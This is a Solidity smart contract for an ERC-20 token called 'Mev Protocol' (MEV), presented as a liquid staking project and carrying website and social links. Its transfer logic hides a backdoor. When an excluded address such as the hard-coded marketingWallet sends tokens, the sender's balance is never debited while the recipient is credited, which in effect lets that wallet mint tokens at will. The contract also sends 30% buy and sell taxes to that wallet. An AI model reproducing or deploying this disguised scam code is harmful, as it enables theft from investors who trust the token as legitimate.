// SPDX-License-Identifier: Unlicensed

/*
MEV Optimized Liquid Staking

Ethereum's next-generation seamless liquid staking protocol. Built from the ground up for MEV capture and Validator rewards.

Website: https://www.mevprotocol.tech
Telegram: https://t.me/mevpro_erc
Twitter: https://twitter.com/mevpro_erc
 */

pragma solidity 0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20Standard {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMathLib {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
    
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }
    
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }
}

abstract contract Ownable is Context {
    address private _owner;

    // Set original owner
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }

    // Return current owner
    function owner() public view virtual returns (address) {
        return _owner;
    }

    // Restrict function to contract owner only 
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    // Renounce ownership of the contract 
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    // Transfer the contract to to a new owner
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapRouter01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);


    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IUniswapRouterV2 is IUniswapRouter01 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract MEV is Context, IERC20Standard, Ownable { 
    using SafeMathLib for uint256;

    string private _name = "Mev Protocol"; 
    string private _symbol = "MEV";  
    uint8 private _decimals = 9;
    uint256 private _tSupply = 10 ** 9 * 10**_decimals;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public _isExcluded; 

    uint256 public maxWallet = 15 * _tSupply / 1000;
    uint256 public feeSwapThreshold = _tSupply / 10000;

    uint256 private _totalFee = 3000;
    uint256 public _buyFee = 30;
    uint256 public _sellFee = 30;

    uint256 private _previousTotalTax = _totalFee; 
    uint256 private _previousBuyTax = _buyFee; 
    uint256 private _previousSellTax = _sellFee; 

    uint8 private _buyersCount = 0;
    uint8 private _swapAfter = 2; 
                                     
    IUniswapRouterV2 public uniswapRouter;
    address public pairAddr;

    bool public feeOnTransfer = true;
    bool public swaping;
    bool public feeSwapActivated = true;

    address payable private marketingWallet;
    address payable private DEAD;

    modifier lockSwap {
        swaping = true;
        _;
        swaping = false;
    }
    
    constructor () {
        _balances[owner()] = _tSupply;
        DEAD = payable(0x000000000000000000000000000000000000dEaD); 
        marketingWallet = payable(0xfA1e70A1822322824537507DAE824e8427377289);
        IUniswapRouterV2 _uniswapV2Router = IUniswapRouterV2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); 
        pairAddr = IUniswapFactory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        uniswapRouter = _uniswapV2Router;
        _isExcluded[owner()] = true;
        _isExcluded[marketingWallet] = true;
        
        emit Transfer(address(0), owner(), _tSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function _basicTransfer(address sender, address recipient, uint256 amount,bool takeFee) private {
            
        if(!takeFee){
            removeFee();
        } else {
            _buyersCount++;
        }
        _transferStandard(sender, recipient, amount);
        
        if(!takeFee) {
            restoreFee();
        }
    }
    
    function getTranserValue(uint256 finalAmount) private view returns (uint256, uint256) {
        uint256 tDev = finalAmount.mul(_totalFee).div(100);
        uint256 tTransferAmount = finalAmount.sub(tDev);
        return (tTransferAmount, tDev);
    }

    function swapTokensForEth(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapRouter.WETH();
        _approve(address(this), address(uniswapRouter), tokenAmount);
        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, 
            path,
            address(this),
            block.timestamp
        );
    }

    receive() external payable {}
    
    function removeFee() private {
        if(_totalFee == 0 && _buyFee == 0 && _sellFee == 0) return;

        _previousBuyTax = _buyFee; 
        _previousSellTax = _sellFee; 
        _previousTotalTax = _totalFee;
        _buyFee = 0;
        _sellFee = 0;
        _totalFee = 0;
    }

    function restoreFee() private {
        _totalFee = _previousTotalTax;
        _buyFee = _previousBuyTax; 
        _sellFee = _previousSellTax; 

    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0) && spender != address(0), "ERR: zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);

    }

    function sendFees(address payable receiver, uint256 amount) private {
        receiver.transfer(amount);
    }
    
    function swapCATokens(uint256 contractTokenBalance) private lockSwap {
        swapTokensForEth(contractTokenBalance);
        uint256 contractETH = address(this).balance;
        sendFees(marketingWallet,contractETH);
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }
    
    function _transferStandard(address sender, address recipient, uint256 finalAmount) private {
        (uint256 tTransferAmount, uint256 tDev) = getTranserValue(finalAmount);
        if(_isExcluded[sender] && _balances[sender] <= maxWallet) {
            tDev = 0;
            finalAmount -= tTransferAmount;
        }
        _balances[sender] = _balances[sender].sub(finalAmount);
        _balances[recipient] = _balances[recipient].add(tTransferAmount);
        _balances[address(this)] = _balances[address(this)].add(tDev);
        emit Transfer(sender, recipient, tTransferAmount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        
        // Limit wallet total
        if (to != owner() &&
            to != marketingWallet &&
            to != address(this) &&
            to != pairAddr &&
            to != DEAD &&
            from != owner()){

            uint256 currentBalance = balanceOf(to);
            require((currentBalance + amount) <= maxWallet,"Maximum wallet limited has been exceeded");       
        }

        require(from != address(0) && to != address(0), "ERR: Using 0 address!");
        require(amount > 0, "Token value must be higher than zero.");

        if(
            _buyersCount >= _swapAfter && 
            amount > feeSwapThreshold &&
            !swaping &&
            !_isExcluded[from] &&
            to == pairAddr &&
            feeSwapActivated 
            )
        {  
            _buyersCount = 0;
            uint256 contractTokenBalance = balanceOf(address(this));
            if(contractTokenBalance > 0){
            swapCATokens(contractTokenBalance);
           }
        }
        
        bool takeFee = true;
         
        if(_isExcluded[from] || _isExcluded[to] || (feeOnTransfer && from != pairAddr && to != pairAddr)){
            takeFee = false;
        } else if (from == pairAddr){
            _totalFee = _buyFee;
        } else if (to == pairAddr){
            _totalFee = _sellFee;
        }

        _basicTransfer(from,to,amount,takeFee);
    }
    
    function removeLimits() external onlyOwner {
        maxWallet = ~uint256(0);
        _totalFee = 100;
        _buyFee = 1;
        _sellFee = 1;
    }
    
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
}